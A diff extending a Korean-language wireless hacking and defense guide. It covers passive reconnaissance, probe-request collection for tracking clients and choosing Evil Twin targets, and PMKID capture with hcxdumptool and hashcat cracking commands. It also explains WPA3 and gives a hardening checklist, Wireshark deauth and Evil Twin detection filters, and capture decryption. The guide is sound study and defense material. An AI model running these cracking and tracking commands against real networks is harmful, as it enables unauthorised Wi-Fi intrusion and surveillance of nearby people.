@@ -252,3 +252,353 @@ kismet -c wlan0mon
 # airbase-ng으로 허니팟 AP
 airbase-ng -e "HoneyPot_AP" -c 6 wlan0mon
 ```
+
+---
+
+## 8. 무선 네트워크 정찰 심화
+
+### 수동 정찰 (탐지 위험 없음)
+```bash
+# 채널 호핑하며 모든 AP 스캔
+airodump-ng wlan0mon --band abg    # 2.4GHz + 5GHz 동시 스캔
+
+# 숨겨진 SSID 탐지
+# AP가 SSID를 브로드캐스트하지 않아도
+# 클라이언트가 Probe Request 보낼 때 캡처 가능
+airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon
+# → 클라이언트의 Probe Request에서 실제 SSID 확인
+
+# 5GHz 대역 스캔
+airmon-ng start wlan0 36    # 36번 채널로 고정 (5GHz)
+airodump-ng --band a wlan0mon
+```
+
+### 클라이언트 정보 수집
+```bash
+# Probe Request 수집 (클라이언트가 연결 시도한 AP 목록)
+airodump-ng wlan0mon | grep "STATION"
+# STATION 컬럼: 클라이언트 MAC
+# Probed ESSIDs: 클라이언트가 찾는 SSID 목록
+
+# 특정 클라이언트 추적
+airodump-ng wlan0mon --bssid [클라이언트MAC] 
+
+# 클라이언트가 저장한 SSID 목록 수집 (수동 정찰)
+# → Evil Twin 공격의 타겟 SSID 확보
+```
+
+---
+
+## 9. PMKID 공격 (핸드셰이크 없이 크랙)
+
+### hcxdumptool을 이용한 PMKID 캡처
+```bash
+# 설치
+apt-get install hcxdumptool hcxtools
+
+# PMKID 캡처 (클라이언트 불필요)
+hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
+
+# 특정 AP만 타겟
+hcxdumptool -i wlan0mon -o pmkid.pcapng \
+    --filterlist_ap=target_bssid.txt \
+    --filtermode=2 \
+    --enable_status=1
+
+# pcapng를 hashcat 형식으로 변환
+hcxpcapngtool -o hash.hc22000 pmkid.pcapng
+
+# hashcat으로 크랙
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d    # 숫자 8자리
+hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l    # 소문자 8자리
+```
+
+### PMKID 이해
+```
+PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
+
+장점:
+- 클라이언트가 연결되지 않아도 AP만 있으면 공격 가능
+- 4-way Handshake 캡처 불필요
+- 단 하나의 EAPOL 프레임만 필요
+
+제한:
+- 일부 오래된 AP는 PMKID를 포함하지 않음
+- WPA2만 해당 (WPA3의 SAE는 PMKID 공격에 안전)
+```
+
+---
+
+## 10. WPA3 및 현대적 무선 보안
+
+### WPA3 특징과 SAE
+```
+SAE (Simultaneous Authentication of Equals):
+- Dragonfly 핸드셰이크 기반
+- 전방 비밀성 (Forward Secrecy) 제공
+- 오프라인 딕셔너리 공격 불가
+- PMKID 공격 불가
+
+WPA3 모드:
+- WPA3-Personal (SAE): 가정용, PSK 대체
+- WPA3-Enterprise (192-bit): 기업용, Suite-B 암호화
+- WPA3 Enhanced Open (OWE): 오픈 AP 암호화
+
+# WPA3 Dragonblood 취약점 (2019)
+- 사이드채널 공격으로 비밀번호 추측 가능
+- DoS 공격 (안전한 채널 다운그레이드)
+→ 대부분 패치됨
+```
+
+### 무선 네트워크 암호화 비교
+```
+프로토콜 강도 비교 (약 → 강):
+WEP < WPA-TKIP < WPA2-TKIP < WPA2-AES(CCMP) < WPA3-SAE
+
+권장 설정:
+- WPA2-AES (CCMP) 최소
+- WPA3-SAE 권장
+- Mixed WPA2/WPA3 (호환성)
+- TKIP 절대 사용 금지
+- WPS 비활성화 권장
+```
+
+---
+
+## 11. 무선 해킹 방어 체크리스트
+
+### AP 보안 설정
+```
+기본 보안:
+[ ] WPA3 또는 WPA2-AES 사용
+[ ] 강력한 패스워드 (12자 이상, 특수문자 포함)
+[ ] WPS 비활성화
+[ ] 관리자 기본 자격증명 변경
+[ ] 최신 펌웨어 업데이트
+[ ] SSID 브로드캐스트 (숨겨도 보안 효과 미미)
+[ ] 게스트 네트워크 분리 (VLAN)
+
+고급 보안:
+[ ] 802.1X Enterprise 인증 (RADIUS)
+[ ] 클라이언트 격리 (AP 간 통신 차단)
+[ ] 무선 IDS 설치 (Kismet, WIPS)
+[ ] MAC 필터링 (우회 가능하나 추가 레이어)
+[ ] 송출 전력 최소화 (필요한 범위만)
+[ ] WIDS (Wireless Intrusion Detection System)
+```
+
+### Deauthentication 공격 방어
+```
+802.11w (PMF: Protected Management Frames):
+- 관리 프레임 암호화/무결성 검증
+- Deauth 공격, 차단 공격 방어
+
+# hostapd.conf에서 PMF 활성화
+ieee80211w=2       # 2=required (강제), 1=optional
+
+# 클라이언트에서 확인 (Linux)
+iw dev wlan0 link | grep -i pmf
+```
+
+---
+
+## 12. 무선 패킷 분석 — Wireshark 802.11
+
+### 802.11 프레임 구조 분석
+```
+Wireshark 802.11 필터:
+  wlan.fc.type == 0         # Management 프레임
+  wlan.fc.type == 1         # Control 프레임  
+  wlan.fc.type == 2         # Data 프레임
+
+  wlan.fc.type_subtype == 0x08  # Beacon 프레임
+  wlan.fc.type_subtype == 0x04  # Probe Request
+  wlan.fc.type_subtype == 0x05  # Probe Response
+  wlan.fc.type_subtype == 0x0b  # Authentication
+  wlan.fc.type_subtype == 0x00  # Association Request
+  wlan.fc.type_subtype == 0x0c  # Deauthentication ← 공격 탐지
+  wlan.fc.type_subtype == 0x0a  # Disassociation
+
+# Deauth 공격 탐지
+wlan.fc.type_subtype == 0x0c and wlan.da == ff:ff:ff:ff:ff:ff
+# 브로드캐스트 Deauth = 공격 패턴
+
+# 4-way Handshake 캡처 확인
+eapol and wlan.bssid == AA:BB:CC:DD:EE:FF
+```
+
+### 채널 전환 공격 (Channel Switch Announcement)
+```
+공격 원리:
+- 합법적인 AP처럼 채널 전환 공고
+- 클라이언트를 다른 채널로 유도
+- Evil Twin이 해당 채널에서 대기
+
+탐지:
+wlan.tag.number == 37    # Channel Switch Announcement IE
+```
+
+---
+
+## 13. 무선 패킷 분석 심화 — Wireshark 802.11 전체 레퍼런스
+
+### 802.11 관리 프레임 상세
+```
+Management 프레임 서브타입 전체:
+  0x00 = Association Request       # 클라이언트 → AP 연결 요청
+  0x01 = Association Response      # AP → 클라이언트 연결 수락/거부
+  0x02 = Reassociation Request     # 로밍 시 재연결 요청
+  0x03 = Reassociation Response
+  0x04 = Probe Request             # 클라이언트가 AP 탐색
+  0x05 = Probe Response            # AP가 탐색에 응답
+  0x08 = Beacon                    # AP 주기적 브로드캐스트 (100ms 간격)
+  0x0a = Disassociation            # 연결 해제 (일방적)
+  0x0b = Authentication            # 802.11 인증 요청/응답
+  0x0c = Deauthentication          # 인증 해제 (공격에 악용)
+  0x0d = Action                    # 채널 변경 등 관리 동작
+
+Control 프레임 서브타입:
+  0x1a = PS-Poll                   # 절전 모드 폴링
+  0x1b = RTS                       # Request to Send
+  0x1c = CTS                       # Clear to Send
+  0x1d = ACK                       # 데이터 수신 확인
+
+Data 프레임:
+  wlan.fc.type == 2                # 실제 데이터 전송 프레임
+```
+
+### WPA2 4-Way Handshake 패킷 분석
+```
+Wireshark에서 4-Way Handshake 확인:
+  필터: eapol
+
+Message 1 (AP → Client):  ANonce 전송
+Message 2 (Client → AP):  SNonce + MIC 포함 (PTK 생성 시작)
+Message 3 (AP → Client):  GTK 암호화 전송 + MIC
+Message 4 (Client → AP):  설치 확인
+
+핵심: Message 2에서 클라이언트가 PSK를 알고 있음을 증명하는 MIC 포함
+     → 이 패킷을 캡처하면 오프라인 사전 공격으로 PSK 크랙 가능
+
+# 특정 AP의 핸드셰이크만 필터
+eapol && wlan.bssid == aa:bb:cc:dd:ee:ff
+
+# 핸드셰이크 4단계 확인
+eapol && wlan.fc.type_subtype == 0x20    # EAPOL QoS Data
+```
+
+### WEP 분석 (레거시 참고)
+```
+WEP 취약점:
+  - RC4 스트림 암호 사용
+  - 24비트 IV (Initialization Vector) → 재사용 불가피
+  - 같은 IV로 암호화된 두 패킷 → XOR 연산으로 키 복구 가능
+
+Wireshark WEP 필터:
+  wlan.wep.iv                      # IV 필드
+  wlan.fc.protected == 1           # 암호화된 프레임
+
+크랙 조건:
+  - aircrack-ng: 최소 40,000개의 고유 IV 필요 (약 50,000~100,000 패킷)
+  - aireplay-ng --arpreplay로 ARP 패킷 재생하여 IV 수집 가속
+```
+
+### 무선 프레임 신호 강도 분석
+```
+Wireshark에서 무선 신호 정보:
+  필터: radiotap    # RadioTap 헤더 (드라이버가 추가하는 메타데이터)
+
+확인 가능한 정보:
+  radiotap.dbm_antsignal    # 신호 강도 (dBm, 높을수록 강함, 예: -50dBm)
+  radiotap.channel.freq     # 채널 주파수 (MHz)
+  radiotap.datarate         # 데이터 전송률 (Mbps)
+  radiotap.flags.shortpre   # Short Preamble 사용 여부
+
+활용:
+  - 동일 SSID에서 신호 강도 다른 Beacon → Evil Twin 탐지 단서
+  - 비정상적으로 높은 신호 강도 → 가까운 위치의 공격자
+```
+
+### 무선 트래픽 분석 자동화
+```bash
+# airodump-ng 결과를 CSV로 저장 후 분석
+airodump-ng wlan0mon -w scan --output-format csv
+
+# CSV 파싱으로 열린 AP 목록 추출
+awk -F',' '$6 ~ /OPN/ {print $1, $14}' scan-01.csv
+
+# Wireshark + tshark로 Beacon 수집
+tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" \
+    -T fields -e wlan.sa -e wlan.ssid -e radiotap.dbm_antsignal \
+    -e wlan_radio.channel 2>/dev/null | sort -u
+
+# Deauth 공격 탐지 (비정상적으로 많은 Deauth 프레임)
+tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c" \
+    -T fields -e wlan.sa -e wlan.da | sort | uniq -c | sort -rn
+
+# 클라이언트의 Probe Request 수집 (연결 이력)
+tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x04 && wlan.ssid" \
+    -T fields -e wlan.ta -e wlan.ssid 2>/dev/null | sort -u
+```
+
+---
+
+## 14. 무선 네트워크 포렌식
+
+### 캡처 파일에서 WPA2 복호화
+```bash
+# 방법 1: Wireshark GUI
+Edit → Preferences → Protocols → IEEE 802.11
+→ Enable decryption 체크
+→ Decryption keys 추가:
+   Key type: wpa-pwd
+   Key: MyPassword:MySSID
+
+# 방법 2: tshark 명령줄
+tshark -r wifi_capture.pcap \
+    -o "wlan.enable_decryption: TRUE" \
+    -o 'uat:80211_keys:"wpa-pwd","password:SSID"' \
+    -Y http -T fields -e ip.src -e http.host -e http.request.uri
+
+# 방법 3: airdecap-ng (별도 도구)
+airdecap-ng -e "MySSID" -p "MyPassword" capture.cap
+# → 복호화된 파일 capture-dec.cap 생성
+```
+
+### PMKID vs 4-Way Handshake 비교
+```
+4-Way Handshake:
+  - 클라이언트가 AP에 연결될 때 캡처
+  - 클라이언트가 있어야 함 (Deauth 강제 유도 필요)
+  - EAPOL 프레임 4개 필요
+
+PMKID:
+  - AP만 있으면 됨 (클라이언트 불필요)
+  - Association Request의 RSN IE에서 추출
+  - PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID || STA_MAC)
+  - hcxdumptool으로 캡처
+
+공통 크랙 방법:
+  # hashcat으로 GPU 가속 크랙
+  hashcat -m 22000 hash.hc22000 rockyou.txt
+  
+  # 속도 비교:
+  CPU (aircrack-ng): ~1,000 PMK/sec
+  GPU (hashcat):     ~100,000~1,000,000 PMK/sec (GPU 성능에 따라 다름)
+```
+
+### 채널 분석 및 간섭 탐지
+```bash
+# 채널별 AP 분포 확인
+airodump-ng wlan0mon --band abg 2>/dev/null | grep -v "BSSID" | \
+    awk '{print $4}' | sort | uniq -c | sort -rn
+
+# 2.4GHz 비겹치는 채널: 1, 6, 11
+# 5GHz: 36, 40, 44, 48, 149, 153, 157, 161 등
+
+# Wireshark로 채널 오버랩 분석
+# 동일 채널의 다른 SSID 확인
+tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x08" \
+    -T fields -e wlan_radio.channel -e wlan.ssid | sort | uniq -c
+```
